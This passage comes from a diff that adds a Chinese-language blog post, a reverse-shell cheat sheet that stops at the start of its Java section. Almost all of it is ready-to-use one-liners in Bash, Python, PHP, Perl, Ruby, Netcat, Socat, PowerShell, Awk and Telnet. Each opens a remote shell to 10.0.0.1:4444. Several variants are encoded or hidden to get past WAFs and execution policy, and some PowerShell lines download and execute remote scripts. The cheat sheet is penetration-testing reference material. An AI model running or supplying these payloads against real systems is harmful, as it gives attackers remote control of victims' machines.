+<li><code>0&gt;&amp;1</code>：将标准输入也重定向到同一套接字，实现双向通信。</li>
+</ul>
+<h3 id="1-2-使用-exec-重定向"><a href="#1-2-使用-exec-重定向" class="headerlink" title="1.2 使用 exec 重定向"></a>1.2 使用 exec 重定向</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/10.0.0.1/4444; <span class="built_in">cat</span> &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>此变体逐行读取命令并回传结果，适合 <code>/dev/tcp</code> 可用但 Bash 版本较低的场景。</p>
+<h3 id="1-3-命名管道版（无-dev-tcp-时）"><a href="#1-3-命名管道版（无-dev-tcp-时）" class="headerlink" title="1.3 命名管道版（无 &#x2F;dev&#x2F;tcp 时）"></a>1.3 命名管道版（无 &#x2F;dev&#x2F;tcp 时）</h3><p>当 <code>/dev/tcp</code> 不可用（如在容器精简镜像或某些嵌入式系统中），可借助 <code>mkfifo</code> 创建命名管道，并配合 <code>nc</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /tmp/f; <span class="built_in">mkfifo</span> /tmp/f; <span class="built_in">cat</span> /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.0.0.1 4444 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-URL-编码版（绕过-WAF）"><a href="#1-4-URL-编码版（绕过-WAF）" class="headerlink" title="1.4 URL 编码版（绕过 WAF）"></a>1.4 URL 编码版（绕过 WAF）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;%26 /dev/tcp/10.0.0.1/4444 0&gt;%261&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：目标系统有 Bash，且 <code>/dev/tcp</code> 编译支持未被禁用。这是最简单、兼容性最好的方案。</p>
+</blockquote>
+<hr>
+<h2 id="二、Python-反弹-Shell"><a href="#二、Python-反弹-Shell" class="headerlink" title="二、Python 反弹 Shell"></a>二、Python 反弹 Shell</h2><h3 id="2-1-Python-2"><a href="#2-1-Python-2" class="headerlink" title="2.1 Python 2"></a>2.1 Python 2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.0.0.1&quot;,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Python-2（精简版，利用-pty-spawn）"><a href="#2-2-Python-2（精简版，利用-pty-spawn）" class="headerlink" title="2.2 Python 2（精简版，利用 pty.spawn）"></a>2.2 Python 2（精简版，利用 pty.spawn）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.0.0.1&quot;,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Python-3"><a href="#2-3-Python-3" class="headerlink" title="2.3 Python 3"></a>2.3 Python 3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.0.0.1&quot;,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-Python-3（使用-pty-获得伪终端）"><a href="#2-4-Python-3（使用-pty-获得伪终端）" class="headerlink" title="2.4 Python 3（使用 pty 获得伪终端）"></a>2.4 Python 3（使用 pty 获得伪终端）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.0.0.1&quot;,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-一行版（适合命令注入，无空格用-Tab-或-IFS-替代）"><a href="#2-5-一行版（适合命令注入，无空格用-Tab-或-IFS-替代）" class="headerlink" title="2.5 一行版（适合命令注入，无空格用 Tab 或 ${IFS} 替代）"></a>2.5 一行版（适合命令注入，无空格用 Tab 或 ${IFS} 替代）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import</span></span><br><span class="line"><span class="string">socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.0.0.1&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#x27;/bin/sh&#x27;,&#x27;-i&#x27;])&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：Python 广泛预装于各类 Linux 发行版及 macOS，且 Python 3 在新版系统中逐步替代 Python 2。适合目标无法使用 Bash <code>/dev/tcp</code> 时作为备选。</p>
+</blockquote>
+<hr>
+<h2 id="三、PHP-反弹-Shell"><a href="#三、PHP-反弹-Shell" class="headerlink" title="三、PHP 反弹 Shell"></a>三、PHP 反弹 Shell</h2><p>PHP 是 Web 渗透中最常遇到的语言，命令注入常出现在 Web 应用的 <code>system()</code>、<code>exec()</code> 等函数中。</p>
+<h3 id="3-1-PHP-exec-版（最简）"><a href="#3-1-PHP-exec-版（最简）" class="headerlink" title="3.1 PHP exec 版（最简）"></a>3.1 PHP exec 版（最简）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4444); exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>fsockopen</code> 打开 TCP 连接，返回文件描述符。</li>
+<li><code>exec</code> 启动 Bash，将其标准输入输出全部绑定到该连接。</li>
+</ul>
+<h3 id="3-2-PHP-proc-open-版（更稳定）"><a href="#3-2-PHP-proc-open-版（更稳定）" class="headerlink" title="3.2 PHP proc_open 版（更稳定）"></a>3.2 PHP proc_open 版（更稳定）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4444); $proc=proc_open(&quot;/bin/bash -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-PHP-shell-exec-版（适合注入利用）"><a href="#3-3-PHP-shell-exec-版（适合注入利用）" class="headerlink" title="3.3 PHP shell_exec 版（适合注入利用）"></a>3.3 PHP shell_exec 版（适合注入利用）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$s=fsockopen(&quot;10.0.0.1&quot;,4444); shell_exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-PHP-一行通过-system-注入"><a href="#3-4-PHP-一行通过-system-注入" class="headerlink" title="3.4 PHP 一行通过 system() 注入"></a>3.4 PHP 一行通过 system() 注入</h3><p>当漏洞点在 Web 应用的 <code>system()</code> 调用时，传入 payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$s=fsockopen(&quot;10.0.0.1&quot;,4444);while($l=fgets($s))&#123;exec($l,$o);echo implode(&quot;\n&quot;,$o).&quot;\n&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>此变体逐行读取命令并返回结果，不启动完整交互 Shell，但兼容性更广。</p>
+<blockquote>
+<p><strong>适用场景</strong>：目标为 LAMP&#x2F;LEMP 架构的 Web 服务器，PHP 几乎必装。尤其适合通过 Web 漏洞（如文件上传、命令注入）触发。</p>
+</blockquote>
+<hr>
+<h2 id="四、Perl-反弹-Shell"><a href="#四、Perl-反弹-Shell" class="headerlink" title="四、Perl 反弹 Shell"></a>四、Perl 反弹 Shell</h2><p>Perl 在老旧 Unix 系统上较为常见，也常用于 CGI 脚本场景。</p>
+<h3 id="4-1-基础版"><a href="#4-1-基础版" class="headerlink" title="4.1 基础版"></a>4.1 基础版</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket; $i=&quot;10.0.0.1&quot;; $p=4444; socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;)); if(connect(S,sockaddr_in($p,inet_aton($i))))&#123; open(STDIN,&quot;&gt;&amp;S&quot;); open(STDOUT,&quot;&gt;&amp;S&quot;); open(STDERR,&quot;&gt;&amp;S&quot;); exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-精简版（无需-Socket-模块）"><a href="#4-2-精简版（无需-Socket-模块）" class="headerlink" title="4.2 精简版（无需 Socket 模块）"></a>4.2 精简版（无需 Socket 模块）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork; exit,if($p); $c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4444&quot;); STDIN-&gt;fdopen($c,r); $~-&gt;fdopen($c,w); system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-Windows-目标版"><a href="#4-3-Windows-目标版" class="headerlink" title="4.3 Windows 目标版"></a>4.3 Windows 目标版</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4444&quot;); STDIN-&gt;fdopen($c,r); $~-&gt;fdopen($c,w); system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：目标为老旧 Unix&#x2F;Linux 系统（如 Solaris、旧版 CentOS）或 Windows 已安装 Perl（如 Strawberry Perl）时。</p>
+</blockquote>
+<hr>
+<h2 id="五、Ruby-反弹-Shell"><a href="#五、Ruby-反弹-Shell" class="headerlink" title="五、Ruby 反弹 Shell"></a>五、Ruby 反弹 Shell</h2><p>Ruby 在安装了 Metasploit 或某些 DevOps 工具链的系统中常见。</p>
+<h3 id="5-1-基础版"><a href="#5-1-基础版" class="headerlink" title="5.1 基础版"></a>5.1 基础版</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,4444).to_i; exec sprintf(&quot;/bin/bash -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-使用-spawn"><a href="#5-2-使用-spawn" class="headerlink" title="5.2 使用 spawn"></a>5.2 使用 spawn</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork; c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4444&quot;); loop&#123; (c.gets); (c.print(`#&#123;$_&#125;`)) &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-Windows-版（调用-cmd-exe）"><a href="#5-3-Windows-版（调用-cmd-exe）" class="headerlink" title="5.3 Windows 版（调用 cmd.exe）"></a>5.3 Windows 版（调用 cmd.exe）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4444&quot;); while(cmd=c.gets); IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;; end&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：目标运行 Ruby on Rails、Metasploit，或系统管理员安装了 Ruby 环境。</p>
+</blockquote>
+<hr>
+<h2 id="六、Netcat（nc）反弹-Shell"><a href="#六、Netcat（nc）反弹-Shell" class="headerlink" title="六、Netcat（nc）反弹 Shell"></a>六、Netcat（nc）反弹 Shell</h2><p>Netcat 是”网络瑞士军刀”，但要注意存在两种主流变体：<strong>传统 Netcat</strong>（GNU&#x2F;传统版）与 <strong>OpenBSD Netcat</strong>，它们的参数差异巨大。</p>
+<h3 id="6-1-传统-Netcat（GNU-Hobbit-版，支持-e）"><a href="#6-1-传统-Netcat（GNU-Hobbit-版，支持-e）" class="headerlink" title="6.1 传统 Netcat（GNU&#x2F;Hobbit 版，支持 -e）"></a>6.1 传统 Netcat（GNU&#x2F;Hobbit 版，支持 -e）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 10.0.0.1 4444</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-e</code> 参数直接指定连接建立后执行的程序，最简洁。</li>
+</ul>
+<h3 id="6-2-传统-Netcat-管道版（无-e-也可用）"><a href="#6-2-传统-Netcat-管道版（无-e-也可用）" class="headerlink" title="6.2 传统 Netcat 管道版（无 -e 也可用）"></a>6.2 传统 Netcat 管道版（无 -e 也可用）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.0.1 4444 -c /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>部分版本使用 <code>-c</code> 替代 <code>-e</code>。</p>
+<h3 id="6-3-OpenBSD-Netcat（不支持-e）"><a href="#6-3-OpenBSD-Netcat（不支持-e）" class="headerlink" title="6.3 OpenBSD Netcat（不支持 -e）"></a>6.3 OpenBSD Netcat（<strong>不支持 -e</strong>）</h3><p>大多数现代 Linux 发行版（Ubuntu、Debian、CentOS 7+）预装的是 OpenBSD 变体，<strong>不支持 <code>-e</code> 参数</strong>，需要使用管道或命名管道：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /tmp/f; <span class="built_in">mkfifo</span> /tmp/f; <span class="built_in">cat</span> /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.0.0.1 4444 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>或简化为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-4-BusyBox-nc"><a href="#6-4-BusyBox-nc" class="headerlink" title="6.4 BusyBox nc"></a>6.4 BusyBox nc</h3><p>某些嵌入式设备中的 <code>nc</code> 来自 BusyBox，功能更精简：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.0.1 4444 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>如果 BusyBox nc 也不支持 <code>-e</code>，则使用命名管道方案。</p>
+<blockquote>
+<p><strong>识别技巧</strong>：执行 <code>nc -h 2&gt;&amp;1 | head -5</code> 查看帮助，若有 <code>-e</code> 选项说明为传统版；若提示 “unknown option” 则是 OpenBSD 版。</p>
+</blockquote>
+<hr>
+<h2 id="七、Socat-反弹-Shell"><a href="#七、Socat-反弹-Shell" class="headerlink" title="七、Socat 反弹 Shell"></a>七、Socat 反弹 Shell</h2><p>Socat 是 Netcat 的增强版，支持更多协议（TCP、UDP、SSL、SOCKS 等），但默认并非系统预装。</p>
+<h3 id="7-1-基础版（明文-TCP）"><a href="#7-1-基础版（明文-TCP）" class="headerlink" title="7.1 基础版（明文 TCP）"></a>7.1 基础版（明文 TCP）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-分离-exec-参数的写法"><a href="#7-2-分离-exec-参数的写法" class="headerlink" title="7.2 分离 exec: 参数的写法"></a>7.2 分离 <code>exec:</code> 参数的写法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-connect:10.0.0.1:4444 <span class="built_in">exec</span>:<span class="string">&quot;bash -li&quot;</span>,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-SSL-加密版"><a href="#7-3-SSL-加密版" class="headerlink" title="7.3 SSL 加密版"></a>7.3 SSL 加密版</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane openssl-connect:10.0.0.1:4444,verify=0</span><br></pre></td></tr></table></figure>
+
+<p>攻击端对应监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat openssl-listen:4444,reuseaddr,cert=server.pem,verify=0</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-完整-PTY-分配版"><a href="#7-4-完整-PTY-分配版" class="headerlink" title="7.4 完整 PTY 分配版"></a>7.4 完整 PTY 分配版</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：目标已安装 Socat，或需要加密传输（SSL 版）、需要完整 PTY 支持时。</p>
+</blockquote>
+<hr>
+<h2 id="八、PowerShell-反弹-Shell"><a href="#八、PowerShell-反弹-Shell" class="headerlink" title="八、PowerShell 反弹 Shell"></a>八、PowerShell 反弹 Shell</h2><p>Windows 渗透测试的标配。适用于目标为 Windows Server、域控、或企业终端。</p>
+<h3 id="8-1-基础-TCP-反弹-Shell"><a href="#8-1-基础-TCP-反弹-Shell" class="headerlink" title="8.1 基础 TCP 反弹 Shell"></a>8.1 基础 TCP 反弹 Shell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-NoP</span> <span class="literal">-NonI</span> <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-Exec</span> Bypass <span class="literal">-Command</span> <span class="string">&quot;<span class="variable">$c</span>=New-Object System.Net.Sockets.TCPClient(&#x27;10.0.0.1&#x27;,4444); <span class="variable">$s</span>=<span class="variable">$c</span>.GetStream(); [byte[]]<span class="variable">$b</span>=0..65535|%&#123;0&#125;; while((<span class="variable">$i</span>=<span class="variable">$s</span>.Read(<span class="variable">$b</span>,0,<span class="variable">$b</span>.Length)) -ne 0)&#123; <span class="variable">$d</span>=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$b</span>,0,<span class="variable">$i</span>); <span class="variable">$sb</span>=(iex <span class="variable">$d</span> 2&gt;&amp;1 | Out-String ); <span class="variable">$sb2</span>=<span class="variable">$sb</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;; <span class="variable">$eb</span>=([text.encoding]::ASCII).GetBytes(<span class="variable">$sb2</span>); <span class="variable">$s</span>.Write(<span class="variable">$eb</span>,0,<span class="variable">$eb</span>.Length); <span class="variable">$s</span>.Flush() &#125;; <span class="variable">$c</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-NoP</code> &#x3D; <code>-NoProfile</code>，<code>-NonI</code> &#x3D; <code>-NonInteractive</code>，<code>-W Hidden</code> &#x3D; 隐藏窗口，<code>-Exec Bypass</code> &#x3D; 绕过执行策略。</li>
+</ul>
+<h3 id="8-2-Nishang-风格（使用-Invoke-PowerShellTcp）"><a href="#8-2-Nishang-风格（使用-Invoke-PowerShellTcp）" class="headerlink" title="8.2 Nishang 风格（使用 Invoke-PowerShellTcp）"></a>8.2 Nishang 风格（使用 Invoke-PowerShellTcp）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;iex (New-Object Net.WebClient).DownloadString(&#x27;http://10.0.0.1/Invoke-PowerShellTcp.ps1&#x27;); Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-Base64-编码版（绕过-WAF-与特殊字符过滤）"><a href="#8-3-Base64-编码版（绕过-WAF-与特殊字符过滤）" class="headerlink" title="8.3 Base64 编码版（绕过 WAF 与特殊字符过滤）"></a>8.3 Base64 编码版（绕过 WAF 与特殊字符过滤）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-e</span> JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADAALgAwAC4AMQAnACwANAA0ADQANAApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJABzAGIAPQAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAPQAkAHMAYgAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABlAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAZQBiACwAMAAsACQAZQBiAC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkA</span><br></pre></td></tr></table></figure>
+
+<p>将原始 payload 转为 Base64（UTF-16LE）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;$c=New-Object System.Net.Sockets.TCPClient(&quot;10.0.0.1&quot;,4444);...&#x27;</span> | iconv -f ASCII -t UTF-16LE | <span class="built_in">base64</span> -w 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-4-精简版（快速利用）"><a href="#8-4-精简版（快速利用）" class="headerlink" title="8.4 精简版（快速利用）"></a>8.4 精简版（快速利用）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;iex (iwr -Uri &#x27;http://10.0.0.1/rev.ps1&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：Windows 目标且 PowerShell 可用（Win7+ 默认安装）。Base64 版适合绕过 WAF 过滤。</p>
+</blockquote>
+<hr>
+<h2 id="九、Awk-反弹-Shell"><a href="#九、Awk-反弹-Shell" class="headerlink" title="九、Awk 反弹 Shell"></a>九、Awk 反弹 Shell</h2><p>Awk 是文本处理工具，几乎在所有 Unix&#x2F;Linux 系统上存在。它也可以建立 TCP 连接——但需 GNU Awk（gawk）支持网络扩展。</p>
+<h3 id="9-1-Gawk-版本"><a href="#9-1-Gawk-版本" class="headerlink" title="9.1 Gawk 版本"></a>9.1 Gawk 版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123; s = &quot;/inet/tcp/0/10.0.0.1/4444&quot;; while (1) &#123; printf(&quot;&gt; &quot;); cmd = (s |&amp; getline); while ((cmd |&amp; getline) &gt; 0) print $0 |&amp; s; close(cmd) &#125; close(s) &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="9-2-调用系统-Shell-的版本"><a href="#9-2-调用系统-Shell-的版本" class="headerlink" title="9.2 调用系统 Shell 的版本"></a>9.2 调用系统 Shell 的版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123; s = &quot;/inet/tcp/0/10.0.0.1/4444&quot;; while (1) &#123; do &#123; s |&amp; getline c; if (c) &#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c) &#125; &#125; while (c != &quot;exit&quot;); close(s) &#125; &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：目标没有传统编程语言环境，但拥有 gawk（Linux 上预置概率高）。此方案非常冷门，较少被安全设备检测。</p>
+</blockquote>
+<hr>
+<h2 id="十、Telnet-反弹-Shell"><a href="#十、Telnet-反弹-Shell" class="headerlink" title="十、Telnet 反弹 Shell"></a>十、Telnet 反弹 Shell</h2><p>Telnet 客户端也可用于构造反弹 Shell，利用命名管道接力。</p>
+<h3 id="10-1-双管道法"><a href="#10-1-双管道法" class="headerlink" title="10.1 双管道法"></a>10.1 双管道法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /tmp/f; <span class="built_in">mkfifo</span> /tmp/f; <span class="built_in">cat</span> /tmp/f | /bin/bash -i 2&gt;&amp;1 | telnet 10.0.0.1 4444 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-2-双向管道法"><a href="#10-2-双向管道法" class="headerlink" title="10.2 双向管道法"></a>10.2 双向管道法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /tmp/a /tmp/b; <span class="built_in">mkfifo</span> /tmp/a; <span class="built_in">mkfifo</span> /tmp/b; telnet 10.0.0.1 4444 &lt; /tmp/a &gt; /tmp/b &amp;; /bin/bash &lt; /tmp/b &gt; /tmp/a</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：目标系统未安装 netcat，但保留了 telnet 客户端（如某些旧版 Windows、嵌入式 Linux）。</p>
+</blockquote>
+<hr>
+<h2 id="十一、Java-反弹-Shell"><a href="#十一、Java-反弹-Shell" class="headerlink" title="十一、Java 反弹 Shell"></a>十一、Java 反弹 Shell</h2><p>Java 在运行了 Tomcat、JBoss、WebLogic、Jenkins 等中间件的服务器上必然可用。</p>
